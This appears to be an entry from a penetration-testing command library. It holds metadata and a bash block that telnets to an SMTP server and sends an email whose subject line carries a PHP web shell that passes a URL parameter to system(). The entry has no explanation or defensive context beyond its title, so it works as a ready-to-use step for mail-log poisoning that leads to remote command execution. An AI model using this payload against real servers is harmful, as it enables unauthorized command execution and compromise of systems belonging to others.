---
id: 58858f77-85e5-45bc-8dda-4590a6d5c41a
name: Telnet SMTP server and send email with PHP code injection
type: command
executor: bash
data: 'telnet 10.10.10.10. 25

  helo ok

  mail from: mail@example.com

  rcpt to: root

  data

  subject: <?php echo system($_GET["cmd"]); ?>

  data2

  .'
output: null
created_at: '2023-04-06T03:55:58.607056+00:00'
updated_at: '2023-04-10T20:22:15.234874+00:00'
---

# Telnet SMTP server and send email with PHP code injection

```bash
telnet 10.10.10.10. 25
helo ok
mail from: mail@example.com
rcpt to: root
data
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```


